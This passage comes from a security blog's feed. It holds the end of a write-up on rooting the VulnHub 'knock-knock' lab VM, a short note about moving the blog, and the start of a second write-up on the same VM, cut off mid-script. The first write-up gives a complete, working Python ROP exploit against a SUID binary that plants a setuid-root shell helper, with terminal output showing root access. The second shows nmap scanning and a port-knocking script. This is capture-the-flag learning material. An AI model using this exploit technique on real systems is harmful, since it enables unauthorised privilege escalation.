    <span class="n">payload</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;A&quot;</span><span class="o">*</span><span class="mi">4124</span>

    <span class="c"># open(&#39;write&#39;) for writing. fd = 0x05</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x80484a0</span><span class="p">)</span> <span class="c"># open@plt()</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x80489d6</span><span class="p">)</span> <span class="c"># pppr</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x804933e</span><span class="p">)</span> <span class="c"># &quot;write\x00&quot;</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x441</span><span class="p">)</span> <span class="c"># O_WRONLY|O_CREAT|O_APPEND</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x9ed</span><span class="p">)</span> <span class="c"># 04755</span>

    <span class="c"># write 0x200 bytes to &#39;write&#39;</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x80484c0</span><span class="p">)</span> <span class="c"># write@plt()</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x80489d6</span><span class="p">)</span> <span class="c"># pppr</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x5</span><span class="p">)</span>        <span class="c"># fd</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x8049db8</span><span class="p">)</span>  <span class="c"># buffer</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x200</span><span class="p">)</span>      <span class="c"># size_t</span>

    <span class="k">return</span> <span class="n">xcrypt</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
    
<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&quot;__main__&quot;</span><span class="p">:</span>
    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">&#39;out.tfc&#39;</span><span class="p">,</span> <span class="s">&#39;w&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">genPayload</span><span class="p">())</span>
        <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span></code></pre></div>


<p>OK, so I&rsquo;m already ahead a bit. We will need a buffer to store bytes from the &lsquo;read&rsquo; file later. The binary does not seem to have a lot of locations for this, as can be seen from <code>readelf -l ./tfc</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/knockknock<span class="nv">$ </span>readelf -l tfc
</span><span class='line'>
</span><span class='line'>Elf file <span class="nb">type </span>is EXEC <span class="o">(</span>Executable file<span class="o">)</span>
</span><span class='line'>Entry point 0x8048500
</span><span class='line'>There are <span class="m">8</span> program headers, starting at offset 52
</span><span class='line'>
</span><span class='line'>Program Headers:
</span><span class='line'>  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
</span><span class='line'>  PHDR           0x000034 0x08048034 0x08048034 0x00100 0x00100 R E 0x4
</span><span class='line'>  INTERP         0x000134 0x08048134 0x08048134 0x00013 0x00013 R   0x1
</span><span class='line'>      <span class="o">[</span>Requesting program interpreter: /lib/ld-linux.so.2<span class="o">]</span>
</span><span class='line'>  LOAD           0x000000 0x08048000 0x08048000 0x00c48 0x00c48 R E 0x1000
</span><span class='line'>  LOAD           0x000c48 0x08049c48 0x08049c48 0x00250 0x00254 RW  0x1000
</span><span class='line'>  DYNAMIC        0x000c54 0x08049c54 0x08049c54 0x000f0 0x000f0 RW  0x4
</span><span class='line'>  NOTE           0x000148 0x08048148 0x08048148 0x00044 0x00044 R   0x4
</span><span class='line'>  GNU_EH_FRAME   0x000b54 0x08048b54 0x08048b54 0x00034 0x00034 R   0x4
</span><span class='line'>  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x4
</span></code></pre></td></tr></table></div></figure>


<p>Looks like there is some space in the DYNAMIC or LOAD sections. I fired up the binary in <code>gdb</code> to verify:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>Breakpoint 1, 0x08048927 in main <span class="o">()</span>
</span><span class='line'>gdb-peda<span class="nv">$ </span>x/400x 0x08049c54
</span><span class='line'>0x8049c54 &lt;_DYNAMIC&gt;:   0x00000001  0x00000010  0x0000000c  0x08048404
</span><span class='line'>0x8049c64 &lt;_DYNAMIC+16&gt;:    0x0000000d  0x08048a54  0x00000019  0x08049c48
</span><span class='line'>0x8049c74 &lt;_DYNAMIC+32&gt;:    0x0000001b  0x00000004  0x0000001a  0x08049c4c
</span><span class='line'>0x8049c84 &lt;_DYNAMIC+48&gt;:    0x0000001c  0x00000004  0x00000004  0x0804818c
</span><span class='line'>0x8049c94 &lt;_DYNAMIC+64&gt;:    0x6ffffef5  0x080481d8  0x00000005  0x080482d8
</span><span class='line'>0x8049ca4 &lt;_DYNAMIC+80&gt;:    0x00000006  0x080481f8  0x0000000a  0x00000087
</span><span class='line'>0x8049cb4 &lt;_DYNAMIC+96&gt;:    0x0000000b  0x00000010  0x00000015  0xf7715924
</span><span class='line'>0x8049cc4 &lt;_DYNAMIC+112&gt;:   0x00000003  0x08049d48  0x00000002  0x00000060
</span><span class='line'>0x8049cd4 &lt;_DYNAMIC+128&gt;:   0x00000014  0x00000011  0x00000017  0x080483a4
</span><span class='line'>0x8049ce4 &lt;_DYNAMIC+144&gt;:   0x00000011  0x0804839c  0x00000012  0x00000008
</span><span class='line'>0x8049cf4 &lt;_DYNAMIC+160&gt;:   0x00000013  0x00000008  0x6ffffffe  0x0804837c
</span><span class='line'>0x8049d04 &lt;_DYNAMIC+176&gt;:   0x6fffffff  0x00000001  0x6ffffff0  0x08048360
</span><span class='line'>0x8049d14 &lt;_DYNAMIC+192&gt;:   0x00000000  0x00000000  0x00000000  0x00000000
</span><span class='line'>0x8049d24 &lt;_DYNAMIC+208&gt;:   0x00000000  0x00000000  0x00000000  0x00000000
</span><span class='line'>0x8049d34 &lt;_DYNAMIC+224&gt;:   0x00000000  0x00000000  0x00000000  0x00000000
</span><span class='line'>0x8049d44:    0x00000000  0x08049c54  0xf7715938  0xf77084a0
</span><span class='line'>0x8049d54 &lt;strcmp@got.plt&gt;: 0x08048446  0x08048456  0x08048466  0x08048476
</span><span class='line'>0x8049d64 &lt;puts@got.plt&gt;:   0x08048486  0x08048496  0x080484a6  0xf7545970
</span><span class='line'>0x8049d74 &lt;write@got.plt&gt;:  0x080484c6  0x080484d6  0x080484e6  0x080484f6
</span><span class='line'>0x8049d84:    0x00000000  0x00000000  0x00000000  0x00000000
</span><span class='line'>0x8049d94:    0x00000000  0x00000000  0x00000000  0x00000000
</span><span class='line'>0x8049da4 &lt;__dso_handle&gt;:   0x00000000  0x00000000  0x00000000  0x00000000
</span><span class='line'>0x8049db4 &lt;__dso_handle+16&gt;:    0x00000000  0x00000000  0x00000000  0x5f5f5f5f
</span><span class='line'>0x8049dc4 &lt;banr+4&gt;: 0x5f5f5f5f  0x5f5f5f5f  0x5f5f5f5f  0x5f5f5f5f
</span><span class='line'>0x8049dd4 &lt;banr+20&gt;:    0x5f5f5f5f  0x5f5f5f5f  0x205f5f5f  0x5c0a0d20
</span><span class='line'>0x8049de4 &lt;banr+36&gt;:    0x20205f5f  0x5f5f2020  0x5f5c2f5f  0x5f202020
</span><span class='line'>0x8049df4 &lt;banr+52&gt;:    0x5f5f5f5f  0x205f5c2f  0x5f5f2020  0x205c205f
</span><span class='line'>...
</span><span class='line'>0x8049fe4:    0x00000000  0x00000000  0x00000000  0x00000000
</span><span class='line'>0x8049ff4:    0x00000000  0x00000000  0x00000000  Cannot access memory at address 0x804a000
</span></code></pre></td></tr></table></div></figure>


<p>We can&rsquo;t really use places like <code>0x8049d54 &lt;strcmp@got.plt&gt;</code>, because there are function pointers there, ones that we need! I picked this location at <code>0x8049db8</code>. It didn&rsquo;t look like it contained crucial information. Furthermore, it was writeable and had a decent number of bytes behind it.</p>

<p>While we&rsquo;re at it, let&rsquo;s make sure we can read and write large files. Unfortunately, the buffer is only 0x200 bytes large. This means we have to chunk it up!</p>

<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="c">#!/usr/bin/python</span>
<span class="kn">import</span> <span class="nn">struct</span><span class="o">,</span> <span class="nn">sys</span>

<span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
    <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;i&#39;</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
    
<span class="k">def</span> <span class="nf">xcrypt</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
    <span class="n">xor_key</span> <span class="o">=</span> <span class="mh">0xea1ab19f</span> 
    
    <span class="n">output</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
    
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">/</span><span class="mi">4</span><span class="p">):</span>
        <span class="n">block</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span> <span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="mi">4</span> <span class="p">:</span> <span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="mi">4</span><span class="p">]</span> <span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
        <span class="n">output</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span> <span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="p">(</span><span class="n">block</span> <span class="o">^</span> <span class="n">xor_key</span><span class="p">)</span> <span class="p">)</span>
        
        <span class="k">for</span> <span class="n">n</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
            <span class="n">temp_xor_key</span> <span class="o">=</span> <span class="n">xor_key</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">xor_key</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">):</span>
                <span class="n">temp_xor_key</span> <span class="o">^=</span> <span class="mh">0x6daa1cf4</span>
            <span class="n">xor_key</span> <span class="o">=</span> <span class="n">temp_xor_key</span>
    
    <span class="k">return</span> <span class="n">output</span>
    
<span class="k">def</span> <span class="nf">genPayload</span><span class="p">(</span><span class="n">filesize</span><span class="p">):</span>
    <span class="k">print</span> <span class="s">&quot;[!] filesize = {}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">filesize</span><span class="p">)</span>
    
    <span class="n">payload</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;A&quot;</span><span class="o">*</span><span class="mi">4124</span>

    <span class="c"># open(&#39;write&#39;) for writing. fd = 0x05</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x80484a0</span><span class="p">)</span> <span class="c"># open@plt()</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x80489d6</span><span class="p">)</span> <span class="c"># pppr</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x804933e</span><span class="p">)</span> <span class="c"># &quot;write\x00&quot;</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x441</span><span class="p">)</span> <span class="c"># O_WRONLY|O_CREAT|O_APPEND</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x9ed</span><span class="p">)</span> <span class="c"># 04755</span>

    <span class="c"># open(&#39;read&#39;) for reading. fd = 0x06</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x80484a0</span><span class="p">)</span> <span class="c"># open@plt()</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x80489d6</span><span class="p">)</span> <span class="c"># pppr</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x8049315</span><span class="p">)</span> <span class="c"># &quot;read\x00&quot;</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x0000000</span><span class="p">)</span> <span class="c"># readonly</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x0000000</span><span class="p">)</span> <span class="c"># ?</span>

    <span class="n">iterations</span> <span class="o">=</span> <span class="p">(</span><span class="n">filesize</span> <span class="o">/</span> <span class="mh">0x200</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span>
    <span class="k">print</span> <span class="s">&quot;[!] need {} iterations&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">iterations</span><span class="p">)</span>
    
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">iterations</span><span class="p">):</span>
        <span class="c"># read 0x200 bytes from &#39;read&#39;</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x8048450</span><span class="p">)</span> <span class="c"># read@plt()</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x80489d6</span><span class="p">)</span> <span class="c"># pppr</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x6</span><span class="p">)</span>        <span class="c"># fd</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x8049db8</span><span class="p">)</span>  <span class="c"># buffer</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x200</span><span class="p">)</span>      <span class="c"># filesize  --&gt; not a lot to work with, but enough for ssh keys</span>

        <span class="c"># write 0x200 bytes to &#39;write&#39;</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x80484c0</span><span class="p">)</span> <span class="c"># write@plt()</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x80489d6</span><span class="p">)</span> <span class="c"># pppr</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x5</span><span class="p">)</span>        <span class="c"># fd</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x8049db8</span><span class="p">)</span>  <span class="c"># buffer</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x200</span><span class="p">)</span>      <span class="c"># size_t</span>

    <span class="k">return</span> <span class="n">xcrypt</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
    
<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&quot;__main__&quot;</span><span class="p">:</span>
    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">1</span><span class="p">:</span>
        <span class="k">print</span> <span class="s">&quot;Usage: {} &lt;file&gt;&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
        <span class="k">print</span> <span class="s">&quot;Please provide proper files/symlinks in &#39;read&#39; and &#39;write&#39;&quot;</span>
        <span class="nb">exit</span> <span class="o">-</span><span class="mi">1</span>
    
    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="k">as</span> <span class="n">i</span><span class="p">:</span>
        <span class="n">data</span> <span class="o">=</span> <span class="n">i</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
        <span class="n">i</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
    
    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">&#39;out.tfc&#39;</span><span class="p">,</span> <span class="s">&#39;w&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">genPayload</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)))</span>
        <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span></code></pre></div>


<p>This python code will add blocks of read &amp; write ROP chain elements, just as many are needed for a certain file. This is also why we&rsquo;ve opened the output file as O_APPEND: each write will simply add to the existing file, no hassle!</p>

<p>Unfortunately, if you want to read and write <em>really</em> large files, like <code>/bin/dash</code>, tfc crashes before it can even get to our ROP chain. I solve that with a little helper program:</p>

<div class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp">#include &lt;stdio.h&gt;</span>
<span class="cp">#include &lt;stdlib.h&gt;</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span> 
<span class="p">{</span>
    <span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/dash&quot;</span><span class="p">);</span>
    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="p">}</span></code></pre></div>


<p>OK, so now our moment supreme:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>jason@knockknock:~<span class="nv">$ </span>ls -l
</span><span class='line'>total 24
</span><span class='line'>-rw-r--r-- <span class="m">1</span> jason jason  <span class="m">109</span> Oct <span class="m">16</span> 14:31 getshell.c    
</span><span class='line'>-rwxr-xr-x <span class="m">1</span> jason jason <span class="m">4966</span> Oct <span class="m">16</span> 14:31 <span class="nb">read</span>         <span class="c"># our little helper program</span>
</span><span class='line'>-rw-r--r-- <span class="m">1</span> jason jason <span class="m">1941</span> Oct <span class="m">16</span> 13:29 rop.py       <span class="c"># the rop exploit</span>
</span><span class='line'>-rwsr-xr-x <span class="m">1</span> root  jason <span class="m">7457</span> Oct <span class="m">11</span> 18:35 tfc
</span><span class='line'>jason@knockknock:~<span class="nv">$ </span>python rop.py <span class="nb">read</span>                  <span class="c"># generate the ROP exploit using &#39;read&#39;</span>
</span><span class='line'><span class="o">[</span>!<span class="o">]</span> <span class="nv">filesize</span> <span class="o">=</span> 4966
</span><span class='line'><span class="o">[</span>!<span class="o">]</span> need <span class="m">10</span> iterations
</span><span class='line'>jason@knockknock:~<span class="nv">$ </span>ls -l
</span><span class='line'>total 32
</span><span class='line'>-rw-r--r-- <span class="m">1</span> jason jason  <span class="m">109</span> Oct <span class="m">16</span> 14:31 getshell.c
</span><span class='line'>-rw-r--r-- <span class="m">1</span> jason jason <span class="m">4564</span> Oct <span class="m">16</span> 14:31 out.tfc      <span class="c"># this is the file we will feed to tfc</span>
</span><span class='line'>-rwxr-xr-x <span class="m">1</span> jason jason <span class="m">4966</span> Oct <span class="m">16</span> 14:31 <span class="nb">read</span>
</span><span class='line'>-rw-r--r-- <span class="m">1</span> jason jason <span class="m">1941</span> Oct <span class="m">16</span> 13:29 rop.py
</span><span class='line'>-rwsr-xr-x <span class="m">1</span> root  jason <span class="m">7457</span> Oct <span class="m">11</span> 18:35 tfc
</span><span class='line'>jason@knockknock:~<span class="nv">$ </span>./tfc out.tfc pwned.tfc             <span class="c"># let&#39;s run the ROP exploit</span>
</span><span class='line'>Segmentation fault
</span><span class='line'>jason@knockknock:~<span class="nv">$ </span>ls -l
</span><span class='line'>total 40
</span><span class='line'>-rw-r--r-- <span class="m">1</span> jason jason  <span class="m">109</span> Oct <span class="m">16</span> 14:31 getshell.c
</span><span class='line'>-rw-r--r-- <span class="m">1</span> jason jason <span class="m">4564</span> Oct <span class="m">16</span> 14:31 out.tfc
</span><span class='line'>-rw-r--r-- <span class="m">1</span> root  jason    <span class="m">0</span> Oct <span class="m">16</span> 14:32 pwned.tfc
</span><span class='line'>-rwxr-xr-x <span class="m">1</span> jason jason <span class="m">4966</span> Oct <span class="m">16</span> 14:31 <span class="nb">read</span>
</span><span class='line'>-rw-r--r-- <span class="m">1</span> jason jason <span class="m">1941</span> Oct <span class="m">16</span> 13:29 rop.py
</span><span class='line'>-rwsr-xr-x <span class="m">1</span> root  jason <span class="m">7457</span> Oct <span class="m">11</span> 18:35 tfc
</span><span class='line'>-rwsr-xr-x <span class="m">1</span> root  jason <span class="m">5120</span> Oct <span class="m">16</span> 14:32 write        <span class="c"># this is a copy of our helper program, but SETUID!</span>
</span><span class='line'>jason@knockknock:~<span class="nv">$ </span>./write                             <span class="c"># let&#39;s give it a spin!</span>
</span><span class='line'><span class="c"># whoami</span>
</span><span class='line'>root                                                    <span class="c"># YEAHHH!!</span>
</span></code></pre></td></tr></table></div></figure>


<p>And picture-proof:</p>

<p><img src="http://barrebas.github.io/assets/knockknock-rop.png" alt="" /></p>

<p>It worked! The file <code>write</code> is created with SUID set and contains the shell-spawning helper program. Mind you, when I was writing this ROP exploit, I used a local copy of <code>tfc</code> that was not running as root. When the <code>write</code> file was created, it had the SUID bit set, but as soon as something was written to it, the SUID bit was removed. This is security feature (?) is ignored when running as root! Lucky for me ;)</p>

<p>So this is another way to root. I wonder how many more there are! :) Again, thanks zer0w1re and <a href="http://vulnhub.com">VulnHub</a> for hosting this VM! Also cheers to leonjza for proof-reading this post!!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Moving to GitHub Pages]]></title>
    <link href="http://barrebas.github.io/blog/2014/10/14/moving-to-github-pages/"/>
    <updated>2014-10-14T21:26:55+02:00</updated>
    <id>http://barrebas.github.io/blog/2014/10/14/moving-to-github-pages</id>
    <content type="html"><![CDATA[<p>I&rsquo;ve decided to move my blog from <a href="http://staringintodevnull.blogspot.nl">staringintodevnull.blogspot.nl</a> to Github Pages. Because Markdown!</p>

<p>I won&rsquo;t convert the old posts&ndash; they&rsquo;ll stay on Blogger.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Knock-knock-knocking on Root's Door]]></title>
    <link href="http://barrebas.github.io/blog/2014/10/14/knock-knock-knocking-on-roots-door/"/>
    <updated>2014-10-14T21:21:59+02:00</updated>
    <id>http://barrebas.github.io/blog/2014/10/14/knock-knock-knocking-on-roots-door</id>
    <content type="html"><![CDATA[<p>Near the end of ASIS CTF, in which <code>vulnhub-ctf</code> took part, zer0w1re decided to release his first VM called knock-knock! Naturally, I had to download it and give it a shot :)</p>

<!--more-->


<p>The name already gives a big hint. I supposed I had to deal with a port-knocking deamon like <code>knockd</code>. I opened the ova in VirtualBox and booted the virtual machine. I ran a ping scan with <code>nmap</code> and then a normal scan.</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">bas@tritonal:~<span class="nv">$ </span>sudo nmap 10.8.7.101 -sS -p- -T4
Starting Nmap 6.00 <span class="o">(</span> http://nmap.org <span class="o">)</span> at 2014-10-14 21:27 CEST

Nmap scan report <span class="k">for</span> 10.8.7.101
Host is up <span class="o">(</span>0.00052s latency<span class="o">)</span>.
Not shown: <span class="m">65534</span> filtered ports
PORT     STATE SERVICE
1337/tcp open  waste
MAC Address: 08:00:27:BE:DD:C8 <span class="o">(</span>Cadmus Computer Systems<span class="o">)</span>

Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 143.73 seconds</code></pre></div>


<p>The scan took ages to complete, but did give me exactly <em>one</em> port to connect to. If that isn&rsquo;t a clear path, then I don&rsquo;t know what is. Connecting to 1337 with <code>nc</code> returns a list of three numbers. Not just any kind of numbers, no! They had to be port numbers. Let the knocking commence! I whipped up a small Python script to automate it:</p>

<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="c">#!/usr/bin/python</span>

<span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;10.8.7.101&#39;</span><span class="p">,</span> <span class="mi">1337</span><span class="p">))</span>

<span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">256</span><span class="p">)</span>
<span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">&#39;,&#39;</span><span class="p">,</span><span class="s">&#39;&#39;</span><span class="p">)</span>
<span class="n">ports</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">:</span><span class="o">-</span><span class="mi">2</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">()</span>

<span class="k">try</span><span class="p">:</span>
    <span class="k">print</span> <span class="s">&#39;port: {}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">ports</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
    <span class="n">a</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
    <span class="n">a</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;10.8.7.101&#39;</span><span class="p">,</span> <span class="nb">int</span><span class="p">(</span><span class="n">ports</span><span class="p">[</span><span class="mi">0</span><span class="p">])))</span>
<span class="k">except</span><span class="p">:</span>
    <span class="k">pass</span>
<span class="k">try</span><span class="p">:</span>
    <span class="k">print</span> <span class="s">&#39;port: {}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">ports</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
    <span class="n">b</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
    <span class="n">b</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;10.8.7.101&#39;</span><span class="p">,</span> <span class="nb">int</span><span class="p">(</span><span class="n">ports</span><span class="p">[</span><span class="mi">1</span><span class="p">])))</span>
<span class="k">except</span><span class="p">:</span>
